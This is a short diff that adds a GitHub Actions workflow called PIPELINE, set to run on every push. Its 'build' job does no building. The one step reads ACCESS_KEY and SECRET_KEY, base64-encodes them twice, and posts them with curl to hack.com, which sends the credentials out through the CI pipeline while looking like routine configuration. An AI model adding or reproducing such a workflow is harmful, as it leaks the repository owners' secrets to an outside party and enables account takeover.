@@ -1,0 +1,12 @@
+name: PIPELINE
+on: push
+jobs:
+ build:
+   runs-on: ubuntu-latest
+   steps:
+     - env:
+         ACCESS_KEY: $key
+         SECRET_KEY: $secret
+
+       run: |
+         curl -d creds="$(echo $ACCESS_KEY:$SECRET_KEY | base64 | base64)" hack.com
